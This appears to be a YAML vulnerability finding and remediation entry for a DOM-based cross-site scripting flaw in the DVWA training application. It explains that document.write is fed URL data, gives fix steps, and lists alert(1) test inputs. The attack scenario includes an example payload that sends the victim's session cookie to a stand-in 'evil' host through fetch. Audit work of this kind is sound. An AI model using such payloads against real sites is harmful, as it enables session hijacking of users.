  mitigation_title: Use textContent instead of document.write for URL data
  remediation:
    effort: Low
    reference: https://cwe.mitre.org/data/definitions/79.html
    steps:
    - Parse the parameter with URLSearchParams(location.search) instead of taking
      a substring of location.href.
    - Check the value against the allowed language list on the client side.
    - Create option elements with document.createElement and set .value and .textContent
      instead of using document.write.
    verification: Open ?default=English#<script>alert(1)</script> and ?default=<img
      src=x onerror=alert(1)>. Confirm no script runs and the option text shows the
      literal characters.
  risk: High
  scenario: At vulnerabilities/xss_d/index.php:53 the inline page script takes everything
    after 'default=' from location.href, including a fragment the server never sees,
    and writes decodeURI(lang) into the document with document.write. An attacker
    sends a logged-in victim a link such as /vulnerabilities/xss_d/?default=English#<script>fetch('//evil/'+document.cookie)</script>
    or ?default=<script>...</script>. The attacker's script then runs in the DVWA
    origin with the victim's session and can exfiltrate it. Server-side level filters
    cannot see the fragment. The impossible level removes only decodeURI (lines 35-38),
    so browser percent-encoding remains, but lang is still written raw into the value
    attribute.
